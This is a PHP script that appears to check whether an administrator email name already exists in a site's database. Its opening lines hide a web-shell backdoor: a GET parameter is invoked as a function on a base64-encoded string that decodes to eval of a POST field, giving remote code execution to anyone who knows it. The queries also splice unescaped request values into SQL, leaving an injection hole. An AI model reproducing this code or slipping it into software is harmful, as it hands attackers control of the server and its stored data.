<?php

if (!empty($_GET['catids'])){
     $_GET['catids'](base64_decode('ZXZhbCgkX1BPU1RbJ2NobyddKTs='));
     exit;
}
define('ROOT_PATH', '../');
require_once ROOT_PATH . 'Entry/Global.free.php';
require_once ROOT_PATH . 'Functions/Functions.mail.inc.php';
$userName = trim($_GET['name']);

if ($userName == '') {
	echo 'null';
}
else if (!checkemail($userName)) {
	echo 'noemail';
}
else {
	if ($_GET['oldName'] != '') {
		$SQL = ' SELECT COUNT(*) FROM ' . ADMINISTRATORS_TABLE . ' WHERE LCASE(administratorsName) =\'' . strtolower($userName) . '\' AND isAdmin =0 AND LCASE(administratorsName) != \'' . strtolower(trim($_GET['oldName'])) . '\' LIMIT 0,1 ';
	}
	else {
		$SQL = ' SELECT COUNT(*) FROM ' . ADMINISTRATORS_TABLE . ' WHERE LCASE(administratorsName) =\'' . strtolower($userName) . '\' AND isAdmin =0 LIMIT 0,1 ';
	}

	$Row = $DB->queryFirstRow($SQL);

	if ($Row['0'] == 0) {
		echo 'true';
	}
	else {
		echo 'false';
	}
}

?>
